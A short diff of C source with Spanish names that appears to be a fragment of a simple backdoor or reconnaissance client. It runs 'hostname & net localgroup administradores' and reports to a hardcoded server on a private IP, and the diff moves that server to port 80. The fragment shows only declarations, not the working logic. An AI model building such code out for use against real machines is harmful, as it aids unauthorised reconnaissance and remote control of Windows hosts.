@@ -6,8 +6,8 @@
 int ejecuta(char[], FILE *);
 int cliente_socket(char *);
 char comando [] = "hostname & net localgroup administradores";
-char ip_server [] = "192.168.8.102";
-int puerto_server = 4443;
+char ip_server [] = "192.168.8.100";
+int puerto_server = 80;
 
 int main(){
     FILE * file_host;
